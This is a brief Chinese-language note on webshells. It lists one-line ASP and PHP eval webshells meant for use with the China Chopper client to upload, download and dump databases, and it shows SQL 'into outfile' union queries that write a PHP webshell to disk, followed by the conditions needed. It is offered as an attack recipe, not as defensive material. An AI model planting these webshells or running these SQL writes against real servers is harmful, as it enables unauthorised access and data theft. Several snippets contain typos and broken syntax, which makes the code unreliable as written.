webshell 
一句话木马配上中国菜刀 
文件名字为 xxx .asp  如ma.asp 

 

```php
asp <%excute(request("value"))%> 

​       <%eval request("pass")%> 

PHP <?php @eval<$_post['pass'] >?> 
```

 用URL地址在中国菜刀使用进行关键查找，下载，上传，拖库等操作 

 

 

sql语句执行写入webshell 

```sql
select "test1 " into outfile "D:/Apperve/tset1.txt" 

select *from hacer union select 1,2,3 into outfile "D://Appserve/test2.txt" 
```

/*将联合查询的所有内容输入到test2.txt中*/ 

```sql
select *from hacer union select 1,<?php @eval($_post['pass']);?>,3 into outfile "D://Appserve/test3.php"   //利用此漏洞上传写入php文件 
```

 使用限制 

1. 需要mssq 或者 mysql 
2. 需要管理员权限 
3.  需要知道物理路径